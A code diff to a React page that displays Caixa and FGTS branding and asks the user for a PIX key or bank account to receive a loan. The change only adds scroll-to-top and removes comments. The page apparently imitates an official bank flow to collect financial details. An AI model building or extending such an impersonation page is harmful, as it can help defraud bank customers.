@@ -1,5 +1,4 @@
-
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import { ArrowRight, CreditCard, BanknoteIcon, User, Check, DollarSign, BarChart3, Home, HelpCircle, MoreHorizontal, Edit } from 'lucide-react';
 import CaixaLogo from '@/components/CaixaLogo';
@@ -23,7 +22,6 @@ const BankDetails = () => {
   const [showPixConfirmation, setShowPixConfirmation] = useState(false);
   const [isEditingPix, setIsEditingPix] = useState(false);
   
-  // Get data from location state
   const { 
     bankLogo, 
     totalAmount, 
@@ -41,6 +39,10 @@ const BankDetails = () => {
     userName: "JUAREZ JOSE FERNANDES DE FREITAS",
     userCPF: "123.456.789-00"
   };
+  
+  useEffect(() => {
+    window.scrollTo(0, 0);
+  }, []);
   
   const formatCurrency = (value: number): string => {
     return new Intl.NumberFormat('pt-BR', {
@@ -82,13 +84,11 @@ const BankDetails = () => {
 
   return (
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
-      {/* Header */}
       <div className="p-4 sm:p-6 flex justify-between items-center">
         <FGTSLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
         <CaixaLogo className={`${isMobile ? 'h-8 w-24' : 'h-10'}`} />
       </div>
 
-      {/* Title */}
       <div className="p-4 sm:p-6">
         <div className="text-white text-2xl font-light">Informações Bancárias</div>
         <div className="text-white opacity-60 text-sm mt-1">
@@ -96,7 +96,6 @@ const BankDetails = () => {
         </div>
       </div>
 
-      {/* PIX Confirmation Dialog */}
       <Dialog open={showPixConfirmation} onOpenChange={setShowPixConfirmation}>
         <DialogContent className="max-w-md mx-auto">
           <DialogHeader>
@@ -137,10 +136,8 @@ const BankDetails = () => {
         </DialogContent>
       </Dialog>
 
-      {/* Main content */}
       <div className="mt-4 flex-1 bg-white rounded-t-3xl overflow-hidden">
         <div className="p-4 sm:p-6 pb-28">
-          {/* User info section */}
           <div className="mb-6">
             <div className="flex items-center gap-2 mb-1">
               <User size={18} className="text-gray-600" />
@@ -151,7 +148,6 @@ const BankDetails = () => {
             </div>
           </div>
           
-          {/* Loan details summary */}
           <div className="bg-blue-50 p-4 rounded-lg mb-6">
             <h3 className="font-semibold text-[#005CA9] mb-2">DADOS DO EMPRÉSTIMO</h3>
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
@@ -170,7 +166,6 @@ const BankDetails = () => {
             </div>
           </div>
           
-          {/* Payment method selection */}
           <div className="mb-6">
             <h3 className="font-semibold text-gray-800 mb-3">CONTA PARA RECEBIMENTO</h3>
             
@@ -192,7 +187,6 @@ const BankDetails = () => {
             </RadioGroup>
           </div>
           
-          {/* Payment details based on selection */}
           {paymentMethod === 'pix' ? (
             <div className="mb-6">
               <Label htmlFor="pixKey" className="block mb-2 font-medium">
@@ -248,7 +242,6 @@ const BankDetails = () => {
             </div>
           )}
           
-          {/* Additional information */}
           <div className="mb-12">
             <div className="bg-yellow-50 p-3 rounded-md mb-4 text-yellow-800 text-sm">
               <div className="font-semibold mb-1">VALOR CAI EM ATÉ 12 HORAS</div>
@@ -260,7 +253,6 @@ const BankDetails = () => {
             </div>
           </div>
           
-          {/* Submit button with more bottom margin */}
           <Button 
             className="w-full bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-6 rounded-full mb-20"
             onClick={handleSubmit}
@@ -272,7 +264,6 @@ const BankDetails = () => {
           </Button>
         </div>
         
-        {/* Footer */}
         <div className="fixed bottom-0 w-full bg-white border-t border-gray-200">
           <div className="flex justify-around items-center py-3">
             <div className="flex flex-col items-center text-gray-500">
